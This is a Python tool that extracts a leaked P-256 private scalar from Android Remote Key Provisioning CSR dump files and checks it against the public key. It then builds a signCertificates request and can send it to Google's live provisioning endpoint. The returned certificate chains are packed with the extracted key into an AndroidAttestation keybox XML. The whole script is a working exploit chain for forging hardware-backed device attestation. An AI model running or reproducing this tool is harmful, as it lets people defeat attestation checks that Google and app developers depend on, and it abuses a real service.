#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import ssl
import sys
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable, List, Tuple
from xml.sax.saxutils import escape

ROOT = Path(__file__).resolve().parents[1]
LEGACY_ROOTS = [
    Path('<PROJECT_ROOT>'),
]
DEFAULT_FINGERPRINT = 'Nothing/PacmanEEA/Pacman:14/UP1A.231005.007/2401142323:user/release-keys'
DEFAULT_HOST = 'remoteprovisioning.googleapis.com'
PROTECTED_HEADERS = bytes.fromhex('a10105')
LEAK_OFFSET = 0x400
OBJECT_LEN = 196
SCALAR_OFFSET = 0x98
SCALAR_LEN = 32

def resolve_recorded_path(path: Path) -> Path:
    if path.exists():
        return path
    for legacy_root in LEGACY_ROOTS:
        try:
            rel = path.relative_to(legacy_root)
        except ValueError:
            continue
        candidate = ROOT / rel
        if candidate.exists():
            return candidate
    return path

# P-256 params for scalar/public verification.
P256_P = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
P256_A = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
P256_GX = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296
P256_GY = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5
P256_N = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551

@dataclass
class CborItem:
    major: int
    value: Any
    start: int
    end: int
    tag: int | None = None

class Cbor:
    def __init__(self, data: bytes):
        self.data = data

    def _read_len(self, ai: int, pos: int) -> tuple[int, int]:
        if ai < 24:
            return ai, pos
        if ai == 24:
            self._need(pos, 1)
            return self.data[pos], pos + 1
        if ai == 25:
            self._need(pos, 2)
            return int.from_bytes(self.data[pos:pos + 2], 'big'), pos + 2
        if ai == 26:
            self._need(pos, 4)
            return int.from_bytes(self.data[pos:pos + 4], 'big'), pos + 4
        if ai == 27:
            self._need(pos, 8)
            return int.from_bytes(self.data[pos:pos + 8], 'big'), pos + 8
        raise ValueError(f'indefinite/unsupported CBOR additional info {ai}')

    def _need(self, pos: int, n: int) -> None:
        if pos + n > len(self.data):
            raise ValueError(f'truncated CBOR at {pos}, need {n} bytes')

    def decode_item(self, pos: int = 0) -> tuple[CborItem, int]:
        self._need(pos, 1)
        start = pos
        ib = self.data[pos]
        pos += 1
        mt = ib >> 5
        ai = ib & 31
        n, pos = self._read_len(ai, pos)
        if mt == 0:
            return CborItem(mt, n, start, pos), pos
        if mt == 1:
            return CborItem(mt, -1 - n, start, pos), pos
        if mt == 2:
            self._need(pos, n)
            end = pos + n
            return CborItem(mt, self.data[pos:end], start, end), end
        if mt == 3:
            self._need(pos, n)
            end = pos + n
            return CborItem(mt, self.data[pos:end].decode('utf-8', 'replace'), start, end), end
        if mt == 4:
            arr: list[CborItem] = []
            for _ in range(n):
                item, pos = self.decode_item(pos)
                arr.append(item)
            return CborItem(mt, arr, start, pos), pos
        if mt == 5:
            mp: list[tuple[CborItem, CborItem]] = []
            for _ in range(n):
                key, pos = self.decode_item(pos)
                val, pos = self.decode_item(pos)
                mp.append((key, val))
            return CborItem(mt, mp, start, pos), pos
        if mt == 6:
            child, end = self.decode_item(pos)
            return CborItem(mt, child, start, end, tag=n), end
        if mt == 7:
            if ai == 20:
                val = False
            elif ai == 21:
                val = True
            elif ai == 22:
                val = None
            else:
                val = {'simple': ai}
            return CborItem(mt, val, start, pos), pos
        raise ValueError(f'bad CBOR major type {mt}')

    def decode_one(self) -> CborItem:
        item, end = self.decode_item(0)
        if end != len(self.data):
            raise ValueError(f'trailing CBOR data at {end}/{len(self.data)}')
        return item

def enc_type(mt: int, n: int) -> bytes:
    if n < 0:
        raise ValueError('negative length')
    h = mt << 5
    if n < 24:
        return bytes([h | n])
    if n <= 0xff:
        return bytes([h | 24, n])
    if n <= 0xffff:
        return bytes([h | 25]) + n.to_bytes(2, 'big')
    if n <= 0xffffffff:
        return bytes([h | 26]) + n.to_bytes(4, 'big')
    return bytes([h | 27]) + n.to_bytes(8, 'big')

def enc_uint(n: int) -> bytes:
    if n < 0:
        raise ValueError('negative uint')
    return enc_type(0, n)

def enc_nint(n: int) -> bytes:
    if n >= 0:
        raise ValueError('non-negative nint')
    return enc_type(1, -1 - n)

def enc_bstr(b: bytes) -> bytes:
    return enc_type(2, len(b)) + b

def enc_text(s: str) -> bytes:
    b = s.encode('utf-8')
    return enc_type(3, len(b)) + b

def enc_array_raw(items: Iterable[bytes]) -> bytes:
    items = list(items)
    return enc_type(4, len(items)) + b''.join(items)

def enc_map_raw(items: Iterable[tuple[bytes, bytes]]) -> bytes:
    items = list(items)
    return enc_type(5, len(items)) + b''.join(k + v for k, v in items)

def enc_unverified_device_info(fingerprint: str) -> bytes:
    return enc_map_raw([(enc_text('fingerprint'), enc_text(fingerprint))])

def cbor_to_summary(raw: bytes | CborItem) -> dict[str, Any]:
    item = raw if isinstance(raw, CborItem) else Cbor(raw).decode_one()
    if item.major == 0:
        return {'type': 'uint', 'value': item.value}
    if item.major == 1:
        return {'type': 'nint', 'value': item.value}
    if item.major == 2:
        return {'type': 'bstr', 'len': len(item.value), 'hex_prefix': item.value[:16].hex()}
    if item.major == 3:
        return {'type': 'text', 'value': item.value}
    if item.major == 4:
        return {'type': 'array', 'len': len(item.value), 'items': [cbor_to_summary(x) for x in item.value[:8]]}
    if item.major == 5:
        return {'type': 'map', 'len': len(item.value), 'items': [[cbor_to_summary(k), cbor_to_summary(v)] for k, v in item.value[:8]]}
    if item.major == 6:
        return {'type': 'tag', 'tag': item.tag, 'value': cbor_to_summary(item.value)}
    return {'type': 'simple', 'value': item.value}

def extract_cose_key_from_maced_public_key(maced_public_key: bytes) -> bytes:
    top = Cbor(maced_public_key).decode_one()
    if top.major != 4 or len(top.value) != 4:
        raise ValueError('MacedPublicKey/COSE_Mac0 must be array(4)')
    payload = top.value[2]
    if payload.major != 2:
        raise ValueError('MacedPublicKey payload must be bstr(COSE_Key)')
    # RKPD decodes the payload byte stream as a map and stores that DataItem as RkpKey.mCoseKey.
    cose = payload.value
    cose_item = Cbor(cose).decode_one()
    if cose_item.major != 5:
        raise ValueError('MacedPublicKey payload is not a COSE_Key map')
    return cose

def build_maced_keys_to_sign(cose_key_raws: list[bytes], maced_keys_mac: bytes) -> bytes:
    if not cose_key_raws:
        raise ValueError('no COSE keys')
    cose_array = enc_array_raw(cose_key_raws)
    return enc_array_raw([
        enc_bstr(PROTECTED_HEADERS),
        enc_map_raw([]),
        enc_bstr(cose_array),
        enc_bstr(maced_keys_mac),
    ])

def build_certificate_request(device_info_raw: bytes, challenge: bytes, protected_data_raw: bytes,
                              maced_keys_to_sign_raw: bytes, fingerprint: str) -> bytes:
    # Mirrors CborUtils.buildCertificateRequest(old):
    # [ [ DeviceInfo-map, UnverifiedDeviceInfo-map ], challenge-bstr, ProtectedData-array/tag, MacedKeysToSign-array ]
    Cbor(device_info_raw).decode_one()
    Cbor(protected_data_raw).decode_one()
    Cbor(maced_keys_to_sign_raw).decode_one()
    device_info_pair = enc_array_raw([device_info_raw, enc_unverified_device_info(fingerprint)])
    return enc_array_raw([
        device_info_pair,
        enc_bstr(challenge),
        protected_data_raw,
        maced_keys_to_sign_raw,
    ])

def _item_to_key(item: CborItem) -> int | str | bytes:
    if item.major in (0, 1, 3):
        return item.value
    if item.major == 2:
        return item.value
    raise ValueError(f'unsupported CBOR map key type {item.major}')

def _cbor_map_to_dict(item: CborItem) -> dict[int | str | bytes, CborItem]:
    if item.major != 5:
        raise ValueError('expected CBOR map')
    return {_item_to_key(k): v for k, v in item.value}

def _public_key_from_cose_key_item(cose_key: CborItem, source: str, index: int) -> dict[str, Any]:
    fields = _cbor_map_to_dict(cose_key)
    curve_item = fields.get(-1)
    x_item = fields.get(-2)
    y_item = fields.get(-3)
    if curve_item is None or curve_item.major != 0:
        raise ValueError(f'{source}[{index}] missing integer curve label -1')
    if x_item is None or x_item.major != 2:
        raise ValueError(f'{source}[{index}] missing bstr public x label -2')
    out: dict[str, Any] = {
        'source': source,
        'index': index,
        'curve': curve_item.value,
        'x': x_item.value,
    }
    if y_item is not None:
        if y_item.major != 2:
            raise ValueError(f'{source}[{index}] public y label -3 is not bstr')
        out['y'] = y_item.value
    return out

def extract_eek_public_keys_from_chain(eek_chain_cbor: bytes) -> list[dict[str, Any]]:
    top = Cbor(eek_chain_cbor).decode_one()
    if top.major != 4:
        raise ValueError('EEK chain must be an array of COSE_Mac0 entries')
    keys: list[dict[str, Any]] = []
    for idx, maced_key in enumerate(top.value):
        if maced_key.major != 4 or len(maced_key.value) != 4:
            raise ValueError(f'EEK chain entry {idx} is not COSE_Mac0 array(4)')
        payload = maced_key.value[2]
        if payload.major != 2:
            raise ValueError(f'EEK chain entry {idx} payload is not bstr')
        cose_key = Cbor(payload.value).decode_one()
        key = _public_key_from_cose_key_item(cose_key, 'eek_chain', idx)
        fields = _cbor_map_to_dict(cose_key)
        kid_item = fields.get(2)
        if kid_item is not None:
            if kid_item.major != 2:
                raise ValueError(f'EEK chain entry {idx} kid label 2 is not bstr')
            key['kid'] = kid_item.value
        keys.append(key)
    return keys

def extract_protected_data_recipient_public_keys(protected_data_cbor: bytes) -> list[dict[str, Any]]:
    top = Cbor(protected_data_cbor).decode_one()
    cose_encrypt = top.value if top.major == 6 and top.tag == 96 else top
    if cose_encrypt.major != 4 or len(cose_encrypt.value) != 4:
        raise ValueError('ProtectedData must be COSE_Encrypt array(4), optionally tag(96)')
    recipients = cose_encrypt.value[3]
    if recipients.major != 4:
        raise ValueError('ProtectedData recipients must be array')
    keys: list[dict[str, Any]] = []
    for idx, recipient in enumerate(recipients.value):
        if recipient.major != 4 or len(recipient.value) != 3:
            raise ValueError(f'ProtectedData recipient {idx} is not array(3)')
        unprotected = recipient.value[1]
        fields = _cbor_map_to_dict(unprotected)
        cose_key = fields.get(-1)
        if cose_key is None:
            raise ValueError(f'ProtectedData recipient {idx} missing unprotected label -1 COSE_Key')
        key = _public_key_from_cose_key_item(cose_key, 'protected_data_recipient', idx)
        kid_item = fields.get(4)
        if kid_item is not None:
            if kid_item.major != 2:
                raise ValueError(f'ProtectedData recipient {idx} kid label 4 is not bstr')
            key['kid'] = kid_item.value
        keys.append(key)
    return keys

def parse_signed_certificates_response(response: bytes) -> list[bytes]:
    top = Cbor(response).decode_one()
    if top.major != 4 or len(top.value) != 2:
        raise ValueError('signed certificate response must be array(2)')
    shared_item, uniques_item = top.value
    if shared_item.major != 2:
        raise ValueError('SharedCertificates must be bstr')
    if uniques_item.major != 4:
        raise ValueError('UniqueCertificates must be array')
    shared = shared_item.value
    chains: list[bytes] = []
    for unique in uniques_item.value:
        if unique.major != 2:
            raise ValueError('UniqueCertificate entry must be bstr')
        chains.append(unique.value + shared)
    return chains

def split_der_cert_chain(chain: bytes) -> list[bytes]:
    certs: list[bytes] = []
    pos = 0
    while pos < len(chain):
        if chain[pos] != 0x30:
            raise ValueError(f'DER cert at {pos} does not start with SEQUENCE')
        if pos + 2 > len(chain):
            raise ValueError('truncated DER length')
        lb = chain[pos + 1]
        if lb < 0x80:
            hdr = 2
            ln = lb
        else:
            n = lb & 0x7f
            if n == 0 or n > 4:
                raise ValueError(f'unsupported DER length byte 0x{lb:02x}')
            if pos + 2 + n > len(chain):
                raise ValueError('truncated DER long length')
            hdr = 2 + n
            ln = int.from_bytes(chain[pos + 2:pos + 2 + n], 'big')
        end = pos + hdr + ln
        if end > len(chain):
            raise ValueError('truncated DER certificate body')
        certs.append(chain[pos:end])
        pos = end
    return certs

def der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b

def tlv(tag: int, body: bytes) -> bytes:
    return bytes([tag]) + der_len(len(body)) + body

def pem(label: str, der: bytes) -> str:
    b64 = base64.encodebytes(der).decode('ascii').replace('\n', '')
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return f'<REDACTED_SECRET_BLOCK>\n'

def make_sec1_der(scalar: bytes, x: bytes, y: bytes) -> bytes:
    oid_prime256v1 = bytes.fromhex('06082a8648ce3d030107')
    body = b''.join([
        tlv(0x02, b'\x01'),
        tlv(0x04, scalar),
        tlv(0xa0, oid_prime256v1),
        tlv(0xa1, tlv(0x03, b'\x00\x04' + x + y)),
    ])
    return tlv(0x30, body)

def make_pkcs8_der(sec1_der: bytes) -> bytes:
    alg = tlv(0x30, bytes.fromhex('06072a8648ce3d0201') + bytes.fromhex('06082a8648ce3d030107'))
    body = tlv(0x02, b'\x00') + alg + tlv(0x04, sec1_der)
    return tlv(0x30, body)

def extract_xy_from_cose(cose: bytes) -> tuple[bytes, bytes]:
    # COSE_Key labels -2 and -3 encode as 0x21 and 0x22; both hold bstr(32).
    xi = cose.find(bytes.fromhex('215820'))
    yi = cose.find(bytes.fromhex('225820'))
    if xi < 0 or yi < 0:
        raise ValueError('COSE_Key x/y markers not found')
    return cose[xi + 3:xi + 35], cose[yi + 3:yi + 35]

def _inv(x: int) -> int:
    return pow(x, P256_P - 2, P256_P)

def _add(p1: tuple[int, int] | None, p2: tuple[int, int] | None) -> tuple[int, int] | None:
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and (y1 + y2) % P256_P == 0:
        return None
    if p1 == p2:
        lam = ((3 * x1 * x1 + P256_A) * _inv((2 * y1) % P256_P)) % P256_P
    else:
        lam = ((y2 - y1) * _inv((x2 - x1) % P256_P)) % P256_P
    x3 = (lam * lam - x1 - x2) % P256_P
    y3 = (lam * (x1 - x3) - y1) % P256_P
    return x3, y3

def _mul(k: int, point: tuple[int, int] = (P256_GX, P256_GY)) -> tuple[int, int] | None:
    out = None
    while k:
        if k & 1:
            out = _add(out, point)
        point = _add(point, point)  # type: ignore[assignment]
        k >>= 1
    return out

def extract_sideleak_scalar(priv_full: bytes) -> tuple[bytes, bytes]:
    obj = priv_full[LEAK_OFFSET:LEAK_OFFSET + OBJECT_LEN]
    if len(obj) != OBJECT_LEN:
        raise ValueError('private full buffer too small for sideleak object')
    scalar = obj[SCALAR_OFFSET:SCALAR_OFFSET + SCALAR_LEN]
    k = int.from_bytes(scalar, 'big')
    if not (1 <= k < P256_N):
        raise ValueError('sideleak scalar outside P-256 order')
    return obj, scalar

def verify_scalar_matches_public(scalar: bytes, x: bytes, y: bytes) -> bool:
    derived = _mul(int.from_bytes(scalar, 'big'))
    return derived == (int.from_bytes(x, 'big'), int.from_bytes(y, 'big'))

def write_cert_chain_artifacts(chain: bytes, outdir: Path, prefix: str = 'cert') -> list[Path]:
    outdir.mkdir(parents=True, exist_ok=True)
    certs = split_der_cert_chain(chain)
    paths: list[Path] = []
    for i, cert in enumerate(certs):
        der_path = outdir / f'{prefix}_{i:02d}.der'
        pem_path = outdir / f'{prefix}_{i:02d}.pem'
        der_path.write_bytes(cert)
        pem_path.write_text(pem('CERTIFICATE', cert), encoding='ascii')
        paths.append(der_path)
    (outdir / f'{prefix}_chain.pem').write_text(''.join(pem('CERTIFICATE', c) for c in certs), encoding='ascii')
    return paths

def make_android_attestation_xml(device_id: str, private_key_pem: str, cert_pems: list[str]) -> str:
    certs = '\n'.join(
        '        <Certificate format="pem">\n' + cert.rstrip('\n') + '\n        </Certificate>'
        for cert in cert_pems
    )
    return f'''<?xml version="1.0"?>
<AndroidAttestation>
  <NumberOfKeyboxes>1</NumberOfKeyboxes>
  <Keybox DeviceID="{escape(device_id)}">
    <Key algorithm="ecdsa">
      <PrivateKey format="pem">
{private_key_pem.rstrip()}
      </PrivateKey>
      <CertificateChain>
        <NumberOfCertificates>{len(cert_pems)}</NumberOfCertificates>
{certs}
      </CertificateChain>
    </Key>
  </Keybox>
</AndroidAttestation>
'''

def post_sign_certificates(host: str, challenge: bytes, request_body: bytes, request_id: str, timeout: int = 30) -> tuple[dict[str, Any], bytes]:
    # RKPD uses Android Base64 flags=10: URL-safe alphabet, no wrapping.
    challenge_q = base64.urlsafe_b64encode(challenge).decode('ascii')
    url = f'https://{host}/v1:signCertificates?challenge={challenge_q}&request_id={request_id}'
    req = urllib.request.Request(url, data=request_body, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl.create_default_context()) as resp:
            body = resp.read()
            return {'url': url, 'status': resp.status, 'headers': dict(resp.headers), 'response_len': len(body)}, body
    except urllib.error.HTTPError as e:
        body = e.read()
        return {'url': url, 'status': e.code, 'reason': e.reason, 'headers': dict(e.headers), 'response_len': len(body), 'error_body_prefix_hex': body[:64].hex()}, body

def build_from_dirs(csr_run: Path, geek_dir: Path, outdir: Path, fingerprint: str) -> dict[str, Any]:
    raw = csr_run / 'raw'
    if not raw.is_dir():
        raw = csr_run
    pub_path = raw / 'rkp_gen_test_pub_len.bin'
    priv_path = raw / 'rkp_gen_test_priv_full.bin'
    cose = extract_cose_key_from_maced_public_key(pub_path.read_bytes())
    x, y = extract_xy_from_cose(cose)
    priv_full = priv_path.read_bytes()
    side_obj, scalar = extract_sideleak_scalar(priv_full)
    scalar_match = verify_scalar_matches_public(scalar, x, y)
    if not scalar_match:
        raise ValueError('sideleak scalar does not match RKP public key')
    maced = build_maced_keys_to_sign([cose], (raw / 'csr_maced_keys_len.bin').read_bytes())
    challenge = (geek_dir / 'challenge.bin').read_bytes()
    cert_req = build_certificate_request(
        device_info_raw=(raw / 'csr_device_info_len.bin').read_bytes(),
        challenge=challenge,
        protected_data_raw=(raw / 'csr_protected_data_len.bin').read_bytes(),
        maced_keys_to_sign_raw=maced,
        fingerprint=fingerprint,
    )
    protected_recipients = extract_protected_data_recipient_public_keys((raw / 'csr_protected_data_len.bin').read_bytes())
    google_eek_keys = extract_eek_public_keys_from_chain((geek_dir / 'geek_curve_2.cbor').read_bytes())
    google_eek_x = {k['x'] for k in google_eek_keys}
    google_eek_kids = {k['kid'] for k in google_eek_keys if 'kid' in k}
    outdir.mkdir(parents=True, exist_ok=True)
    (outdir / 'cose_key_0.cbor').write_bytes(cose)
    (outdir / 'maced_keys_to_sign.cbor').write_bytes(maced)
    (outdir / 'certificate_request.cbor').write_bytes(cert_req)
    (outdir / 'challenge.bin').write_bytes(challenge)
    (outdir / 'private_scalar.bin').write_bytes(scalar)
    (outdir / 'rkp_sideleak_object_196.bin').write_bytes(side_obj)
    (outdir / 'public_xy.bin').write_bytes(x + y)
    sec1 = make_sec1_der(scalar, x, y)
    pkcs8 = make_pkcs8_der(sec1)
    (outdir / 'ec_private_key_sec1.der').write_bytes(sec1)
    (outdir / 'ec_private_key_sec1.pem').write_text(pem('EC PRIVATE KEY', sec1), encoding='ascii')
    (outdir / 'ec_private_key_pkcs8.der').write_bytes(pkcs8)
    (outdir / 'ec_private_key_pkcs8.pem').write_text(pem('PRIVATE KEY', pkcs8), encoding='ascii')
    summary = {
        'csr_run': str(csr_run),
        'raw_dir': str(raw),
        'geek_dir': str(geek_dir),
        'fingerprint': fingerprint,
        'challenge_len': len(challenge),
        'challenge_hex': challenge.hex(),
        'cose_key_len': len(cose),
        'cose_key_sha256': hashlib.sha256(cose).hexdigest(),
        'public_xy_sha256': hashlib.sha256(x + y).hexdigest(),
        'private_scalar_sha256': hashlib.sha256(scalar).hexdigest(),
        'sideleak_object_sha256': hashlib.sha256(side_obj).hexdigest(),
        'scalar_matches_public': scalar_match,
        'protected_data_recipient_public_x': [r['x'].hex() for r in protected_recipients],
        'google_eek_public_x': [k['x'].hex() for k in google_eek_keys],
        'protected_data_recipient_matches_google_eek': [r['x'] in google_eek_x for r in protected_recipients],
        'protected_data_recipient_kid': [r['kid'].hex() for r in protected_recipients if 'kid' in r],
        'google_eek_kid': [k['kid'].hex() for k in google_eek_keys if 'kid' in k],
        'protected_data_recipient_kid_matches_google_eek': [
            ('kid' in r and r['kid'] in google_eek_kids) for r in protected_recipients
        ],
        'maced_keys_to_sign_len': len(maced),
        'certificate_request_len': len(cert_req),
        'artifacts': {
            'certificate_request': str(outdir / 'certificate_request.cbor'),
            'maced_keys_to_sign': str(outdir / 'maced_keys_to_sign.cbor'),
            'cose_key': str(outdir / 'cose_key_0.cbor'),
            'private_scalar': str(outdir / 'private_scalar.bin'),
            'private_key_pkcs8_pem': str(outdir / 'ec_private_key_pkcs8.pem'),
            'private_key_sec1_pem': str(outdir / 'ec_private_key_sec1.pem'),
        },
        'cbor_summary': {
            'certificate_request': cbor_to_summary(cert_req),
            'maced_keys_to_sign': cbor_to_summary(maced),
        },
    }
    (outdir / 'build_summary.json').write_text(json.dumps(summary, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')
    return summary

def finalize_response(outdir: Path, response: bytes) -> dict[str, Any]:
    chains = parse_signed_certificates_response(response)
    result: dict[str, Any] = {'chain_count': len(chains), 'chains': []}
    pkcs8_pem = (outdir / 'ec_private_key_pkcs8.pem').read_text(encoding='ascii')
    for i, chain in enumerate(chains):
        cdir = outdir / f'chain_{i:02d}'
        cdir.mkdir(parents=True, exist_ok=True)
        (cdir / 'cert_chain.der').write_bytes(chain)
        cert_paths = write_cert_chain_artifacts(chain, cdir)
        cert_pems = [(cdir / f'cert_{j:02d}.pem').read_text(encoding='ascii') for j in range(len(cert_paths))]
        (cdir / 'key.xml').write_text(make_android_attestation_xml(f'google_rkp_test_{i:02d}', pkcs8_pem, cert_pems), encoding='utf-8')
        result['chains'].append({
            'index': i,
            'chain_len': len(chain),
            'cert_count': len(cert_paths),
            'sha256': hashlib.sha256(chain).hexdigest(),
            'dir': str(cdir),
            'xml': str(cdir / 'key.xml'),
        })
    (outdir / 'signed_chains_summary.json').write_text(json.dumps(result, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')
    return result

def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description='Build RKPD signCertificates request from direct CSR sideleak artifacts and optionally send it.')
    ap.add_argument('--csr-run', type=Path, default=Path((ROOT / 'rkp_research/LATEST_DIRECT_CSR_MATRIX.txt').read_text().strip()) / 'curve2_test1')
    ap.add_argument('--geek-dir', type=Path, default=Path((ROOT / 'rkp_research/LATEST_GEEK_FETCH.txt').read_text().strip()))
    ap.add_argument('--outdir', type=Path, default=ROOT / f'rkp_research/signcerts_request_{time.strftime("%Y%m%d_%H%M%S")}')
    ap.add_argument('--fingerprint', default=DEFAULT_FINGERPRINT)
    ap.add_argument('--host', default=DEFAULT_HOST)
    ap.add_argument('--send', action='store_true')
    ap.add_argument('--request-id', default=None)
    args = ap.parse_args(argv)

    csr_run = resolve_recorded_path(args.csr_run).resolve()
    geek_dir = resolve_recorded_path(args.geek_dir).resolve()
    summary = build_from_dirs(csr_run, geek_dir, args.outdir.resolve(), args.fingerprint)
    request_id = args.request_id or str(uuid.uuid4())
    summary['request_id'] = request_id
    summary['host'] = args.host
    if args.send:
        cert_req = (args.outdir / 'certificate_request.cbor').read_bytes()
        challenge = (args.outdir / 'challenge.bin').read_bytes()
        info, body = post_sign_certificates(args.host, challenge, cert_req, request_id)
        (args.outdir / 'response_http.json').write_text(json.dumps(info, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')
        (args.outdir / 'response.cbor').write_bytes(body)
        summary['http'] = info
        if info.get('status') == 200:
            try:
                signed = finalize_response(args.outdir, body)
                summary['signed'] = signed
            except Exception as e:
                summary['signed_parse_error'] = repr(e)
        (args.outdir / 'build_summary.json').write_text(json.dumps(summary, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')
    print(json.dumps(summary, indent=2, ensure_ascii=False))
    print(args.outdir.resolve())
    return 0

if __name__ == '__main__':
    raise SystemExit(main(sys.argv[1:]))
